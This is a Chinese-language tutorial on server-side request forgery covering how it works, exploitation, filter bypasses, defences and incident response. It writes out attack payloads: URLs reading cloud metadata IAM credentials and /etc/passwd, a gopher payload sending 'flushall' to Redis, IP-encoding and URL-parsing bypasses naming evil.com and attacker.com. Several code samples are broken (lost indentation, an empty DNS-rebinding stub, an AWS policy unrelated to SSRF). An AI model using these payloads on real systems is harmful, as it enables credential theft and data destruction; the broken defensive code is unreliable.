# SSRF（服务端请求伪造）

## 1. SSRF攻击原理

### 1.1 基本概念

SSRF（Server-Side Request Forgery）是一种由攻击者构造请求，由服务端发起请求的安全漏洞。攻击者利用服务端作为代理，发起非预期的网络请求。

### 1.2 产生原因

- **服务端接受URL参数并获取资源**

- **对用户输入的URL未充分验证**

- **服务端可访问内网资源**

- **协议处理不当**

### 1.3 攻击流程

```textile
攻击者构造恶意URL → 服务端接收请求 → 服务端发起内部请求 → 访问敏感资源/执行恶意操作
```

## 2. SSRF分类

### 2.1 按攻击目标分类

#### 2.1.1 内网探测

```http
http://localhost:8080
http://192.168.1.1/admin
http://127.0.0.1:3306
```

#### 2.1.2 云服务元数据访问

```http
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
```

#### 2.1.3 端口扫描

```http
http://target.com/redirect?url=http://192.168.1.1:22
http://target.com/redirect?url=http://127.0.0.1:6379
```

### 2.2 按攻击方式分类

#### 2.2.1 基本SSRF

```http
GET /proxy?url=http://internal-server.com HTTP/1.1
```

#### 2.2.2 盲SSRF

- 服务端发起请求但不返回响应内容

- 通过时间延迟、错误信息等判断

#### 2.2.3 文件读取SSRF

```http
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
```

## 3. 常见利用方式

### 3.1 内网服务探测

```bash
#常见内网IP段

10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
127.0.0.0/8
```

### 3.2 云元数据服务利用

```bash
#AWS元数据

curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP元数据
curl http://metadata.google.internal/computeMetadata/v1/
```

### 3.3 协议利用

#### 3.3.1 HTTP/HTTPS协议

```http
http://internal-api:8080/admin
https://192.168.1.1:443/secret
```

#### 3.3.2 File协议

```http
file:///etc/passwd
file:///C:/Windows/win.ini
```

#### 3.3.3 Dict协议

```http
dict://localhost:6379/info
```

#### 3.3.4 Gopher协议

```http
gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
```

#### 3.3.5 FTP协议

```http
ftp://attacker.com:21/file.txt
```

### 3.4 应用层利用

#### 3.4.1 Redis未授权访问

```http
http://target.com/ssrf?url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
```

#### 3.4.2 FastCGI RCE

```http
http://target.com/ssrf?url=fastcgi://127.0.0.1:9000
```

## 4. 绕过技术

### 4.1 域名解析绕过

```http
# 使用十进制IP
http://2130706433 # 127.0.0.1
http://3232235521 # 192.168.0.1

# 使用八进制IP
http://0177.0.0.1 # 127.0.0.1

# 使用十六进制IP
http://0x7f.0.0.1 # 127.0.0.1
```

### 4.2 URL解析混淆

```http
# 使用@符号
http://example.com@127.0.0.1

# 使用#
http://127.0.0.1#@example.com

# 使用短域名
http://xip.io/127.0.0.1.xip.io
http://nip.io/127.0.0.1.nip.io
```

### 4.3 重定向绕过

```http
# 利用开放重定向
http://target.com/redirect?url=http://192.168.1.1

# 自建重定向服务
Location: http://127.0.0.1:22 
```

### 4.4 协议转换

```http
# 利用URL解析差异

http://127.0.0.1:80@evil.com
http://127.0.0.1%20@evil.com 
```

### 4.5 DNS重绑定

```python
# 配置DNS服务器，第一次返回合法IP，第二次返回内网IP

import dns.resolver

def dns_rebinding():
 # 第一次查询返回外部IP
 # 第二次查询返回127.0.0.1
 pass 
```

## 5. 防御措施

### 5.1 输入验证和过滤

#### 5.1.1 白名单验证

```python
def validate_url(url):
 allowed_domains = ['example.com', 'cdn.example.com']

try:
 parsed = urlparse(url)
 if parsed.hostname not in allowed_domains:
 return False

# 验证协议
if parsed.scheme not in ['http', 'https']:
    return False

return True

except:
 return False
```

#### 5.1.2 黑名单过滤

```python
def block_internal_ips(url):
 blocked_ips = [
 '127.0.0.1', 'localhost', '0.0.0.0',
 '10.', '172.16.', '172.17.', '172.18.', '172.19.',
 '172.20.', '172.21.', '172.22.', '172.23.', '172.24.',
 '172.25.', '172.26.', '172.27.', '172.28.', '172.29.',
 '172.30.', '172.31.', '192.168.', '169.254.'
 ]
parsed = urlparse(url)
hostname = parsed.hostname

for blocked_ip in blocked_ips:
 if hostname.startswith(blocked_ip):
 return False

return True
```

### 5.2 网络层防护

#### 5.2.1 出站流量控制

```bash
# iptables规则示例

iptables -A OUTPUT -p tcp -d 127.0.0.0/8 -j DROP
iptables -A OUTPUT -p tcp -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -p tcp -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -p tcp -d 192.168.0.0/16 -j DROP
```

#### 5.2.2 使用网络隔离

```yaml
# Docker网络配置

version: '3'
services:
 app:
 network_mode: "bridge"
 networks:
 - public_network 
```

### 5.3 应用层防护

#### 5.3.1 使用URL解析库

```python
import urllib.parse
from urllib.parse import urlparse

def safe_url_fetch(url):
     parsed = urlparse(url)
     #解析主机名并解析DNS

    hostname = parsed.hostname
    ip = socket.gethostbyname(hostname)

    # 检查是否为内网IP

    if is_internal_ip(ip):
         raise Exception("Internal IP addresses are not allowed")
# 继续处理请求 
```

#### 5.3.2 禁用危险协议

```python
ALLOWED_SCHEMES = ['http', 'https']

def validate_scheme(url):
 parsed = urlparse(url)
 if parsed.scheme not in ALLOWED_SCHEMES:
 raise ValueError("Unsupported URL scheme")
```

### 5.4 认证和授权

#### 5.4.1 服务端认证

```python
def make_authenticated_request(url):
 # 添加服务端认证token
 headers = {
 'Authorization': f'Bearer {SERVER_TOKEN}',
 'User-Agent': 'Internal-Service/1.0'
 }
response = requests.get(url, headers=headers, timeout=5)
return response
```

## 6. 检测工具和方法

### 6.1 自动化工具

- **SSRFmap** - 自动化SSRF测试工具

- **Gopherus** - Gopher协议攻击工具

- **Burp Suite Collaborator** - 带外检测工具

### 6.2 手动检测方法

```http
# 基础检测
/proxy?url=http://127.0.0.1:22
/proxy?url=http://169.254.169.254/latest/meta-data/

# 带外检测
/proxy?url=http://your-burp-collaborator.com

# 时间延迟检测
/proxy?url=http://192.168.1.1:80
```

### 6.3 云环境检测

```bash
# 检查元数据服务可访问性

curl -s http://169.254.169.254/
curl -s http://metadata.google.internal/computeMetadata/v1/
```

## 7. 最佳实践

### 7.1 开发阶段

1. **永远不要信任用户提供的URL**

2. **实施严格的URL验证和白名单**

3. **禁用不必要的URL协议**

4. **使用认证机制访问内部服务**

### 7.2 部署阶段

1. **配置网络隔离**

2. **限制出站网络连接**

3. **使用专用服务账户**

4. **定期更新和打补丁**

### 7.3 运维阶段

1. **监控异常网络请求**

2. **定期安全审计**

3. **实施最小权限原则**

4. **建立应急响应流程**

## 8. 云环境特定防护

### 8.1 AWS防护

```json
{
 "Version": "2012-10-17",
 "Statement": [
 {
 "Effect": "Deny",
 "Action": "*",
 "Resource": "*",
 "Condition": {
 "StringEquals": {
 "aws:ResourceAccount": "123456789012"
 }
 }
 }
 ]
}
```

### 8.2 容器环境防护

```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
 name: deny-internal-traffic
spec:
 rules:

- to:
  - operation:
     hosts:
    - "169.254.169.254"
    - "metadata.google.internal"
```

## 9. 应急响应

1. **立即隔离受影响的系统**

2. **检查访问日志确定攻击范围**

3. **撤销泄露的凭据和令牌**

4. **修复漏洞并验证防护措施**

5. **通知相关团队和用户**

6. **进行根本原因分析**